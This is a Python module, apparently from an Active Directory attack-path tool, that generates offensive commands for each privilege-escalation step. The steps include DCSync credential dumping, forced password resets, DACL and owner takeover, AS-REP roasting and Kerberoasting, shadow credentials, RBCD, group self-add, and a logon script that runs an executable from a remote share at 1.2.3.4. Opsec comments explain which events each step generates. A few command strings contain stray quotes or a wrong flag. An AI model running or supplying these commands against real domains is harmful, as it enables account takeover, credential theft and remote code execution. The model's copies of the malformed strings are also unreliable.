import uuid
from colorama import Back, Fore, Style

import lib.consts as c
from lib.database import Owned, LDAPObject
from lib.utils import password_to_nthash
from lib.actionutils import *

#
# parent = Owned
# target = LDAPObject
#
# The require argument is useful only with require and require_once.
# require_for_auth and require_targets are managed automatically.
# format is = {'object': LDAPObject, 'class_name': str(require_class_name)}
# There is also an other key 'original_target' for the require_targets.
# 
# All action class have a 'commit' function. This function is used to set
# extra data on the target (not the secret_type which is done with the
# apply* functions). In the commit function you can for example set an SPN,
# change the NP flag, ... This is useful if in the config.ml you have a
# condition on these parameters and they are unset.
# 
# A action class starts with 'x_'.
#

class Action():
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        pass

    def commit(target:LDAPObject):
        pass

    def rollback(target:LDAPObject):
        pass


class x_ForceChangePassword(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Change password of {target.name}, available protocols: smb-samr, rpc-samr, kpasswd',
            'This action will generate a 4724 event on the domain controller that handled the',
            'request. This event may be centrally collected and analyzed by security analysts,',
            'especially for users that are obviously very high privilege groups (i.e.: Domain Admin',
            'users). Finally, by changing a service account password, you may cause that service to',
            'stop functioning properly. This can be bad not only from an opsec perspective, but also',
            'a client management perspective. Be careful!',
        ]

        if parent.krb_auth:
            cmd = "changepasswd.py '{fqdn}/{target.name}@{dc_name}' -altuser '{parent.obj.name}' -k -no-pass -dc-ip {dc_ip} -protocol ldap -newpass '{new_pass}' -reset"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "changepasswd.py '{fqdn}/{target.name}@{dc_name}' -altuser '{parent.obj.name}' -althash :{parent.secret} -dc-ip {dc_ip} -protocol ldap -newpass '{new_pass}' -reset"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "changepasswd.py '{fqdn}/{target.name}@{dc_name}' -altuser '{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -dc-ip {dc_ip} -protocol ldap -newpass '{new_pass}' -reset"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "changepasswd.py '{fqdn}/{target.name}@{dc_name}' -altuser '{parent.obj.name}' -altpass '{parent.secret}' -dc-ip {dc_ip} -protocol ldap -newpass '{new_pass}' -reset"

        print_line(comment, cmd, v)


class x_DCSync(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = 'DCSync {target.name}'

        if parent.krb_auth:
            cmd = "secretsdump.py '{fqdn}/{parent.obj.name}@{dc_name}' -k -no-pass -target-ip {dc_ip} -dc-ip {dc_ip} -just-dc-ntlm"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "secretsdump.py '{fqdn}/{parent.obj.name}@{dc_name}' -hashes :{parent.secret} -target-ip {dc_ip} -dc-ip {dc_ip} -just-dc-ntlm"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "secretsdump.py '{fqdn}/{parent.obj.name}@{dc_name}' -k -no-pass -aesKey {parent.secret} -target-ip {dc_ip} -dc-ip {dc_ip} -just-dc-ntlm"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "secretsdump.py '{fqdn}/{parent.obj.name}:{parent.secret}@{dc_name}' -target-ip {dc_ip} -dc-ip {dc_ip} -just-dc-ntlm"

        print_line(comment, cmd, v)


class x_WriteOwner(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Set the owner of {target.name} to {parent.obj.name}',
            'Modifying permissions on an object will generate 4670 and 4662 events on the',
            'domain controller that handled the request.',
        ]

        if parent.krb_auth:
            cmd = "owneredit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -target '{target.name}' -new-owner '{parent.obj.name}' -action write"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "owneredit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -target '{target.name}' -new-owner '{parent.obj.name}' -action write"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "owneredit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -target '{target.name}' -new-owner '{parent.obj.name}' -action write"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "owneredit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -target '{target.name}' -new-owner '{parent.obj.name}' -action write"

        print_line(comment, cmd, v)


class x_DaclFullControl(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Give full control on {target.name} to {parent.obj.name}',
            'Modifying permissions on an object will generate 4670 and 4662 events on the',
            'domain controller that handled the request. Additional opsec considerations depend',
            'on the target object and how to take advantage of this privilege.',
        ]

        if parent.krb_auth:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights FullControl -action write"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights FullControl -action write"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights FullControl -action write"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights FullControl -action write"

        print_line(comment, cmd, v)


class x_DaclResetPassword(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Give permission to reset password on {target.name} to {parent.obj.name}',
            'Modifying permissions on an object will generate 4670 and 4662 events on the',
            'domain controller that handled the request. Additional opsec considerations depend',
            'on the target object and how to take advantage of this privilege.',
        ]

        if parent.krb_auth:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights ResetPassword -action write"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights ResetPassword -action write"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights ResetPassword -action write"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights ResetPassword -action write"

        print_line(comment, cmd, v)


class x_DaclUserAccountControl(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Give permission to write the property UserAccountControl on {target.name} to {parent.obj.name}',
            'Modifying permissions on an object will generate 4670 and 4662 events on the',
            'domain controller that handled the request. Additional opsec considerations depend',
            'on the target object and how to take advantage of this privilege.',
        ]

        if parent.krb_auth:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf967a68-0de6-11d0-a285-00aa003049e2 -mask write -action write"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn ''{parent.obj.dn}' -target '{target.name}' -rights-guid bf967a68-0de6-11d0-a285-00aa003049e2 -mask write -action write"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn ''{parent.obj.dn}' -target '{target.name}' -rights-guid bf967a68-0de6-11d0-a285-00aa003049e2 -mask write -action write"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf967a68-0de6-11d0-a285-00aa003049e2 -mask write -action write"

        print_line(comment, cmd, v)


class x_EnableNP(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = 'Toggle the flag do_not_preauth on {target.name}'

        if parent.krb_auth:
            cmd = "./tools/toggleNP.py '{fqdn}/{parent.obj.name}@{dc_name}' -use-ldaps -dc-ip {dc_ip} -k -t '{target.name}' -w"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "./tools/toggleNP.py '{fqdn}/{parent.obj.name}@{dc_ip}' -use-ldaps -hashes :{parent.secret} -t '{target.name}' -w"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "./tools/toggleNP.py '{fqdn}/{parent.obj.name}@{dc_ip}' -use-ldaps -k -aesKey {parent.secret} -t '{target.name}' -w"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "./tools/toggleNP.py '{fqdn}/{parent.obj.name}:{parent.secret}@{dc_ip}' -use-ldaps -t '{target.name}' -w"

        print_line(comment, cmd, v)

    def commit(target:LDAPObject):
        target.old_np = target.np
        target.np = True

    def rollback(target:LDAPObject):
        target.np = target.old_np


class x_ASREPRoasting(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)
        comment = 'ASREP request'
        cmd = "GetNPUsers.py '{fqdn}/{target.name}' -no-pass -dc-ip {dc_ip} -request"
        print_line(comment, cmd, v)
        print_comment('Hoping you will crack the ticket... Don\'t forget to modify the cracked password')


class x_DaclInitialProgram(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Give permission to write the property msTSInitialProgram on {target.name} to {parent.obj.name}',
            'Modifying permissions on an object will generate 4670 and 4662 events on the',
            'domain controller that handled the request. Additional opsec considerations depend',
            'on the target object and how to take advantage of this privilege.',
        ]

        if parent.krb_auth:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 9201ac6f-1d69-4dfb-802e-d95510109599 -mask write -action write"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn ''{parent.obj.dn}' -target '{target.name}' -rights-guid 9201ac6f-1d69-4dfb-802e-d95510109599 -mask write -action write"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn ''{parent.obj.dn}' -target '{target.name}' -rights-guid 9201ac6f-1d69-4dfb-802e-d95510109599 -mask write -action write"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 9201ac6f-1d69-4dfb-802e-d95510109599 -mask write -action write"

        print_line(comment, cmd, v)


class x_SetLogonScript(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = 'Set a logon exe on {target.name}'

        if parent.krb_auth:
            cmd = "./tools/logonscript.py '{fqdn}/{parent.obj.name}@{dc_name}' -use-ldaps -dc-ip {dc_ip} -k -t '{target.name}' -write '\\\\1.2.3.4\\file.exe'"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "./tools/logonscript.py '{fqdn}/{parent.obj.name}@{dc_ip}' -use-ldaps -hashes :{parent.secret} -t '{target.name}' -write '\\\\1.2.3.4\\file.exe'"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "./tools/logonscript.py '{fqdn}/{parent.obj.name}@{dc_ip}' -use-ldaps -k -aesKey {parent.secret} -t '{target.name}' -write '\\\\1.2.3.4\\file.exe'"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "./tools/logonscript.py '{fqdn}/{parent.obj.name}:{parent.secret}@{dc_ip}' -use-ldaps -t '{target.name}' -write '\\\\1.2.3.4\\file.exe'"

        print_line(comment, cmd, v)
        print_comment('Wait user logon... Hoping you will get the user password!')


class x_DaclServicePrincipalName(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Give permission to write the property servicePrincipalName on {target.name} to {parent.obj.name}',
            'Modifying permissions on an object will generate 4670 and 4662 events on the',
            'domain controller that handled the request. Additional opsec considerations depend',
            'on the target object and how to take advantage of this privilege.',
        ]

        if parent.krb_auth:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid f3a64788-5306-11d1-a9c5-0000f80367c1 -mask write -action write"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid f3a64788-5306-11d1-a9c5-0000f80367c1 -mask write -action write"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid f3a64788-5306-11d1-a9c5-0000f80367c1 -mask write -action write"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid f3a64788-5306-11d1-a9c5-0000f80367c1 -mask write -action write"

        print_line(comment, cmd, v)


class x_Kerberoasting(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = 'Request a TGS for {target.name}'

        if parent.krb_auth:
            cmd = "GetUserSPNs.py '{fqdn}/{parent.obj.name}' -k -no-pass -dc-ip {dc_ip} -request-user {target.name}"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "GetUserSPNs.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -dc-ip {dc_ip} -request-user {target.name}"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "GetUserSPNs.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -dc-ip {dc_ip} -request-user {target.name}"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "GetUserSPNs.py '{fqdn}/{parent.obj.name}:{parent.secret}' -dc-ip {dc_ip} -request-user {target.name}"

        print_line(comment, cmd, v)
        print_comment('Hoping you will crack the ticket... don\'t forget to modify the cracked password')


class x_WriteSPN(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target, spn=f'{Fore.RED}random/spn{Style.RESET_ALL}')

        comment = [
            'Set an SPN on {target.name} to perform a kerberoasting attack (the SPN must be unique!)',
            'Modifying the servicePrincipalName attribute will not, by default, generate an event',
            'on the Domain Controller. Your target may have configured logging on users to generate',
            '5136 events whenever a directory service is modified, but this configuration is very',
            'rare.'
        ]

        if parent.krb_auth:
            cmd = "./tools/addspn.py '{fqdn}/{parent.obj.name}@{dc_name}' -use-ldaps -dc-ip {dc_ip} -k -t '{target.name}' -add '{spn}'"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "./tools/addspn.py '{fqdn}/{parent.obj.name}@{dc_ip}' -use-ldaps -hashes :{parent.secret} -t '{target.name}' -add '{spn}'"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "./tools/addspn.py '{fqdn}/{parent.obj.name}@{dc_ip}' -use-ldaps -k -aesKey {parent.secret} -t '{target.name}' -add '{spn}'"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "./tools/addspn.py '{fqdn}/{parent.obj.name}:{parent.secret}@{dc_ip}' -use-ldaps -t '{target.name}' -add '{spn}'"

        print_line(comment, cmd, v)

    def commit(target:LDAPObject):
        target.old_spn = list(target.spn)
        target.spn.append('random/spn')

    def rollback(target:LDAPObject):
        target.spn = target.old_spn


class x_DaclKeyCredentialLink(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Give permission to write the property msDS-KeyCredentialLink on {target.name} to {parent.obj.name}',
            'Modifying permissions on an object will generate 4670 and 4662 events on the',
            'domain controller that handled the request. Additional opsec considerations depend',
            'on the target object and how to take advantage of this privilege.',
        ]

        if parent.krb_auth:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 5b47d60f-6090-40b2-9f37-2a4de88f3063 -mask write -action write"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 5b47d60f-6090-40b2-9f37-2a4de88f3063 -mask write -action write"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 5b47d60f-6090-40b2-9f37-2a4de88f3063 -mask write -action write"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 5b47d60f-6090-40b2-9f37-2a4de88f3063 -mask write -action write"

        print_line(comment, cmd, v)


class x_AddKeyCredentialLink(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Add a shadow credential on {target.name}',
            'Executing the attack will generate a 5136 (A directory object was modified) event',
            'at the domain controller if an appropriate SACL is in place on the target object.',
            'If PKINIT is not common in the environment, a 4768 (Kerberos authentication ticket',
            '(TGT) was requested) ticket can also expose the attacker.',
        ]

        if parent.krb_auth:
            cmd = "pywhisker.py -d {fqdn} -u '{parent.obj.name}' -k --no-pass --dc-ip {dc_ip} --use-ldaps -t '{target.name}' -f '{target.name}' --action add -P pfxpassword"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "pywhisker.py -d {fqdn} -u '{parent.obj.name}' -H '{parent.secret}' --dc-ip {dc_ip} --use-ldaps -t '{target.name}' -f '{target.name}' --action add -P pfxpassword"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "pywhisker.py -d {fqdn} -u '{parent.obj.name}' -k --no-pass --aes-key '{parent.secret}' --dc-ip {dc_ip} --use-ldaps -t '{target.name}' -f '{target.name}' --action add -P pfxpassword"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "pywhisker.py -d {fqdn} -u '{parent.obj.name}' -p '{parent.secret}' --dc-ip {dc_ip} --use-ldaps -t '{target.name}' -f '{target.name}' --action add -P pfxpassword"

        print_line(comment, cmd, v)

        comment = 'PFX to TGT on {target.name}'
        cmd = "PKINITtools/gettgtpkinit.py -dc-ip {dc_ip} -cert-pfx '{target.name}.pfx' -pfx-pass pfxpassword '{fqdn}/{target.name}' '{target.name}.ccache'"
        print_line(comment, cmd, v, end=False)
        print_cmd("export KRB5CCNAME='{target.name}.ccache'", v)
        print()


class x_DaclMemberShips(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Give permission to write the property Self-Membership on {target.name} to {parent.obj.name}',
            'Modifying permissions on an object will generate 4670 and 4662 events on the',
            'domain controller that handled the request. Additional opsec considerations depend',
            'on the target object and how to take advantage of this privilege.',
        ]

        if parent.krb_auth:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf9679c0-0de6-11d0-a285-00aa003049e2 -mask write -action write"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf9679c0-0de6-11d0-a285-00aa003049e2 -mask write -action write"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf9679c0-0de6-11d0-a285-00aa003049e2 -mask write -action write"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf9679c0-0de6-11d0-a285-00aa003049e2 -mask write -action write"

        print_line(comment, cmd, v)


class x_DaclSelf(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Give permission to write the property Self on {target.name} to {parent.obj.name}',
            'Modifying permissions on an object will generate 4670 and 4662 events on the',
            'domain controller that handled the request. Additional opsec considerations depend',
            'on the target object and how to take advantage of this privilege.',
        ]

        if parent.krb_auth:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights Custom -mask self -action write"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights Custom -mask self -action write"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights Custom -mask self -action write"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights Custom -mask self -action write"

        print_line(comment, cmd, v)


class x_AddSelf(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Add {parent.obj.name} in the group {target.name}',
            'This action will generate a 4728 event on the domain controller that handled',
            'the request. This event may be centrally collected and analyzed by security',
            'analysts, especially for groups that are obviously very high privilege groups',
            '(i.e.: Domain Admins).',
        ]

        if parent.krb_auth:
            cmd = "./tools/addmember.py '{fqdn}/{parent.obj.name}@{dc_name}' -use-ldaps -dc-ip {dc_ip} -k -t '{target.name}' -add '{parent.obj.dn}'"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "./tools/addmember.py '{fqdn}/{parent.obj.name}@{dc_name}' -use-ldaps -dc-ip {dc_ip} -hashes :{parent.secret} -t '{target.name}' -add '{parent.obj.dn}'"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "./tools/addmember.py '{fqdn}/{parent.obj.name}@{dc_name}' -use-ldaps -dc-ip {dc_ip} -k -aesKey {parent.secret} -t '{target.name}' -add '{parent.obj.dn}'"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "./tools/addmember.py '{fqdn}/{parent.obj.name}:{parent.secret}@{dc_name}' -use-ldaps -dc-ip {dc_ip} -k -t '{target.name}' -add '{parent.obj.dn}'"

        print_line(comment, cmd, v)


# net.py doesn't work for addself, so use only the script addmember.py
x_AddMember = x_AddSelf


class x_DaclAllowedToAct(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Give permission to write the property msDS-AllowedToActOnBehalfOfOtherIdentity on {target.name} to {parent.obj.name}',
            'Modifying permissions on an object will generate 4670 and 4662 events on the',
            'domain controller that handled the request. Additional opsec considerations depend',
            'on the target object and how to take advantage of this privilege.',
        ]

        if parent.krb_auth:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -mask write -action write"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -mask write -action write"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -mask write -action write"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -mask write -action write"

        print_line(comment, cmd, v)


class x_DaclAccountRestrictions(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
'           "Give permission to write the property UserAccountRestrictions on {target.name} to {parent.obj.name}',
            'Modifying permissions on an object will generate 4670 and 4662 events on the',
            'domain controller that handled the request. Additional opsec considerations depend',
            'on the target object and how to take advantage of this privilege.',
        ]

        if parent.krb_auth:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 4c164200-20c0-11d0-a768-00aa006e0529 -mask write -action write"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 4c164200-20c0-11d0-a768-00aa006e0529 -mask write -action write"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 4c164200-20c0-11d0-a768-00aa006e0529 -mask write -action write"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 4c164200-20c0-11d0-a768-00aa006e0529 -mask write -action write"

        print_line(comment, cmd, v)


class x_RBCD(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        if require is None:
            print('error: the RBCD needs a require statement')
            return

        v = vars(glob, parent, target,
                delegate_from=require['object'].obj.name)

        comment = 'Perform an RBCD from {delegate_from} to {target.name}'

        if parent.krb_auth:
            cmd = "rbcd.py '{fqdn}/{parent.obj.name}' -use-ldaps -dc-ip {dc_ip} -k -no-pass -delegate-from '{delegate_from}' -delegate-to '{target.name}' -action write"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "rbcd.py '{fqdn}/{parent.obj.name}' -use-ldaps -dc-ip {dc_ip} -hashes :{parent.secret} -delegate-from '{delegate_from}' -delegate-to '{target.name}' -action write"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "rbcd.py '{fqdn}/{parent.obj.name}' -use-ldaps -dc-ip {dc_ip} -k -no-pass -aesKey {parent.secret} -delegate-from '{delegate_from}' -delegate-to '{target.name}' -action write"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "rbcd.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -delegate-from '{delegate_from}' -delegate-to '{target.name}' -action write"

        print_line(comment, cmd, v)


class x_AllowedToAct(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        GetSTImpersonate(glob, parent, target, previous_action == '::U2U')
